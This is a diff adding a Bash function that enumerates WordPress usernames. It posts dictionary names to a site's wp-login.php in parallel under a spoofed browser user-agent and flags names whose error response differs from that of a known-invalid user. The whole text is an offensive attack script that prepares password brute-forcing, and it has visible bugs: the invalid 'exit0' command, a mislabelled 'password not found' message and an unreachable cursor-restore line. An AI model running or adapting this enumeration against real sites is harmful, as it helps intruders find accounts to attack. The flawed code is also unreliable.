@@ -1,0 +1,37 @@
+function userEnumeration(){
+  userfound="notfound"
+  dictionary_checker
+  threads="on"
+  temp_status=$(mktemp /tmp/status.XXXXXXXXXX)
+  echo -e "\n${blueColour}Running...${endColour}\n"
+  full_url="$final_url/wp-login.php"
+  tput civis
+  (curl -d "log=thisisnotadmin&pwd=123" "$full_url" | sed -n 's/.*thisisnotadmin\s*//p' > /tmp/invalid_user.txt) &>/dev/null
+  invalid_user=$(cat /tmp/invalid_user.txt)
+
+  while read linea; do
+    if grep -q "found" $temp_status; then
+      userfound="found"
+      break
+    fi
+    {
+    (curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -d "log=$linea&pwd=123" "$full_url" | grep "$invalid_user") &>/dev/null 
+    if [ ! $? -eq 0 ]; then
+      echo -e "\n${greenColour}[+]${endColour} The user ${yellowColour}$linea${endColour} exists.\n"
+      userfound=found
+      echo "found" > $temp_status
+    fi
+    } &
+    
+  done < $dictionary
+  wait
+  if grep -q "found" $temp_status; then
+    exit0
+  else
+    echo -e "${redColour}\n[!] Password not found for user ${yellowColour}$users${endColour}\n"
+    exit0
+  fi
+
+  tput cnorm
+
+}
